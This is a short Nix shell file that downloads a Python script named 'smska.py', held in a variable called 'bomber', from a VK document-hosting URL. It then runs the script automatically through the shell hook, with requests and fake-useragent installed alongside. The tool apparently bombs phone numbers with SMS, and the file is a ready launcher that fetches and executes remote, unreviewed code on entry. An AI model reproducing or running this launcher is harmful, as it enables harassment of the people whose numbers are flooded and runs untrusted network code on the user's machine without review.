{ pkgs ? import <nixpkgs> { } }:

let
  bomber = pkgs.fetchurl {
    name = "smska.py";
    url = "https://psv4.userapi.com/c505536/u636410050/docs/d28/f63594899f6c/smska.py\?extra\=1hsG0ymdJNhP2anVhZGnhLtBJTtxTlj1M3d71C0NSdOhMe9agWiar7KK42oaYAUTskDszvDO5FOUrlFhX6IvQVtWr2LC5_XFy9Pn-l4eYqafabBu2KPf9MnYEun0jaY8-cni7Is5-upc7nhjXgqCOcfi\&dl\=1";
    sha256 = "00gnsjxsz4d54igvdp3ssr8vlkifqs6iicm7lfckllwyhs3nq8j5";
  };
  customPython = pkgs.python38.buildEnv.override {
    extraLibs = [ pkgs.python38Packages.termcolor pkgs.python38Packages.fake-useragent pkgs.python38Packages.requests ];
  };
in
pkgs.mkShell {
  buildInputs = [ customPython pkgs.python38Full ];
  shellHook = ''
    python3 ${bomber}
  '';
}
